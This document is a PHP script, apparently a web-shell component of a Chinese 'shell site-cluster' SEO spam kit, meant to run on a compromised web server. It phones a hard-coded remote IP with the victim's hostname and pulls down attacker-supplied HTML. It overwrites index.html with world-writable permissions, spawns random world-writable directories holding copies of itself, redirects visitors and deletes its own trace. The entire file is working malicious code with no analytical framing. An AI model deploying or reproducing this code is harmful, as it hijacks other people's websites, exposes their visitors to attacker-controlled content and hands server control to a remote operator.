<?php
header("Content-Type: text/html;charset=gb2312");
$Remote_server = "http://23.236.64.48/"; 
$directory_Number=5; 

$Branch_directory_1=getCode(mt_rand(3,5));
$Branch_directory_2=getCode(mt_rand(3,5));
$Branch_directory_3=getCode(mt_rand(3,5));
$Branch_directory_4=getCode(mt_rand(3,5));
$Branch_directory_5=getCode(mt_rand(3,5));
$Branch_directory_6=getCode(mt_rand(3,5));
$Branch_directory_7=getCode(mt_rand(3,5));
$Branch_directory_8=getCode(mt_rand(3,5));
$Branch_directory_9=getCode(mt_rand(3,5));
$Branch_directory_10=getCode(mt_rand(3,5));

$Branch_directory = $Branch_directory_1.".".$Branch_directory_2.".".$Branch_directory_3.".".$Branch_directory_4.".".$Branch_directory_5.".".$Branch_directory_6.".".$Branch_directory_7.".".$Branch_directory_8.".".$Branch_directory_9.".".$Branch_directory_10;

$NewFile_content = getFileCont("index.php");

if (empty($NewFile_content)) {
	exit("<p align='center'><font color='red'><b>SHELL站群页面在生成中稍等......</b></font></p>");
}

$ml = $_SERVER['REQUEST_URI'];
$str= explode("/", $ml);
$Quantity = count($str)-1; 

$host_name = str_replace("index.php", "", "http://".$_SERVER['SERVER_NAME'].$_SERVER['REQUEST_URI']);

if ($Quantity<5 && $Quantity>0) {

	$Remote_directory = $Remote_server."/directory.php?type=index.php&host=".$host_name."&directory=".$Branch_directory;
	$Content_directory = getHTTPPage($Remote_directory);	

	$Content_mb=GetHtml($Remote_server."/index.php?type=index.php&host=".$host_name);
	$Branch_directory= explode(".",$Branch_directory);

	echo $Content_mb;

	for ($i=0;$i < count($Branch_directory); $i++) {
		$check = CFolder("./".$Branch_directory[$i]."/");
		if ($check == 1) {
			WriteIn("./".$Branch_directory[$i]."/index.php",$NewFile_content);
		}
	}

	WriteIn("./index.html",$Content_mb);
	chmod("index.html",0777);

	echo "<meta http-equiv='refresh' content='0; url=index.html'>";

        $file = "index.php";  
        if (file_exists($file)) {  
        @unlink ($file);  
                                }  

	exit();

} else {
	$Content_mb=GetHtml($Remote_server."/index.php?type=index.php&host=".$host_name);
	WriteIn("./index.html",$Content_mb);
	chmod("index.html",0777);

	header("Location: index.html");


	exit();
}  



function getCode($iCount) {   
	$arrChar = "012qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM3456789";
	$code="";
    for ( $i = 0; $i < $iCount; $i++ )  
	{ 
		$code .= $arrChar[ mt_rand(0, strlen($arrChar) - 1) ];  
	}  
	return $code; 
}

function Digital($iCount) {
    $arrChar = "0123456789";
	$code="";
    for ( $i = 0; $i < $iCount; $i++ )  
	{ 
		$code .= $arrChar[ mt_rand(0, strlen($arrChar) - 1) ];  
	}  
	return $code; 
}

function sj_int($min, $max) { 
	return mt_rand($min, $max);
}

function WriteIn($testfile, $msg) {
	if (empty($msg)) {
		echo "内容为空";
		return;
	}
	
	$fp = @fopen($testfile,"w");
	fwrite($fp,$msg);
	fclose($fp);
}

function getFileCont($testfile) {
	$restr = '';
	$fp = @fopen($testfile,"r");
	if ($fp) {
		while($line=fgets($fp,1024)) $restr.=$line;
		fclose($fp);
	}
	return $restr;
}

function CFolder($Filepath) {
  if (!file_exists($Filepath)) {
	mkdir($Filepath, 0777);
	return 1;
  }
  return 0;
}

function getHTTPPage($url) {
	$opts = array(
	  'http'=>array(
		'method'=>"GET",
		'header'=>"User-Agent: aQ0O010O"
	  )
	);

	$context = stream_context_create($opts);

	$html = @file_get_contents($url, false, $context);
	if (empty($html)) {
		exit("<p align='center'><font color='red'><b>服务器获取文件内容出错</b></font></p>");
	}
	
	return $html;
} 

function GetHtml($url) {
	return getHTTPPage($url);
}

